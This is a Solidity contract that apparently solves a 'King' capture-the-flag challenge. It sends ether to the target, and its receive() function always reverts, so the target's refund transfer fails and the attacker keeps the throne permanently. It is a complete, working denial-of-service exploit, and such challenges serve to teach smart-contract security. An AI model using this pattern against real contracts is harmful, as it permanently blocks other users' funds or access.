pragma solidity ^0.7.3;

contract KingAttacker {
    address payable challenge;

    constructor(address payable _challengeAddress) {
        challenge = _challengeAddress;
    }

    function attack() external payable {
        // msg.transfer() cannot be used here because it has a strict
        // gas limit that is insufficient to complete the additional
        // msg.transfer that is present in the target contract.
        // Doing so will cause a revert to occur due to not enough gas.
        challenge.call{value: msg.value}("");
    }

    receive() external payable{
        // Causes king.transfer() in target contract to always fail,
        // thus making us the king forever.
        require(false, "cannot claim my throne!");
    }
}
